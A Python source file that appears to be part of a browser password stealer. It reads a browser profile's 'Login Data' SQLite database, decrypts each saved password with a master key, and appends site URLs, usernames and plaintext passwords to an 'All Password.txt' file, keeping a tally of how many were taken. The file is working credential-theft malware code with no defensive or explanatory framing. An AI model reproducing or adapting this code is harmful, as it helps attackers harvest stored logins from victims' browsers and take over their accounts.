import os
import sqlite3

# -------------------------------------------------------
from modules.Browsers.decrypt import decrypt_password
from modules.Browsers._data_breeding_ import Login
# -------------------------------------------------------
import log_Style



def get_login_data(profilePath, masterKey: bytes, allPasswordsFile: str, browserName: str, profile: str) -> None:
    
    login_db: str = f'{profilePath}\\Login Data'
    if not os.path.exists(login_db):
        return None
        
    try:
        with sqlite3.connect(login_db) as conn:
            cursor: object = conn.cursor()
            cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins'
            )
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue

                password: bytes = decrypt_password(row[2], masterKey)

                if password:
                    log_Style.ALL_LOGIN += 1

                    with open(f'{allPasswordsFile}\\All Password.txt', "a", encoding='utf-8', errors='ignore') as allPassword:
                        h = Login(browserName, row[0], row[1], password.decode(), profile)
                        allPassword.write(str(h))
    except Exception as err:
        print(err)
